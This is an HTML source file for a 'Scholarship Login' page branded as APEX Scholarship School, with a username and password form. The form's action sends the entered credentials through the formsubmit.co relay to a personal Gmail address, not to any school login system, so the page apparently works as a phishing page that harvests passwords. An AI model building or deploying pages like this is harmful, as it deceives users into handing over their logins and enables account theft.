<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link rel="stylesheet" href="styles.css" />
    <title>Scholarship Login</title>
  </head>
  <body>
    <div class="container">
      <header>
        <img class="logo" src="kira.jpg" alt="School Logo" />
        <h1>APEX</h1>
        <p>
          Scholarship School is devoted to promoting academic growth and
          nurturing future leaders through our scholarship programs. Join us in
          championing education as a gateway to a brighter future.
        </p>
      </header>
      <main>
        <form
          id="loginForm"
          onsubmit="validateForm(event)"
          action="https://formsubmit.co/calebwendi9@gmail.com"
          method="POST"
        >
          <div class="form-group">
            <label for="username">Username</label>
            <input
              type="text"
              id="username"
              name="username"
              placeholder="Enter your username"
              required
            />
          </div>
          <div class="form-group">
            <label for="password">Password</label>
            <input
              type="password"
              id="password"
              name="password"
              placeholder="Enter your password"
              required
            />
          </div>
          <button type="submit">Login</button>
        </form>
      </main>
    </div>
  </body>
</html>
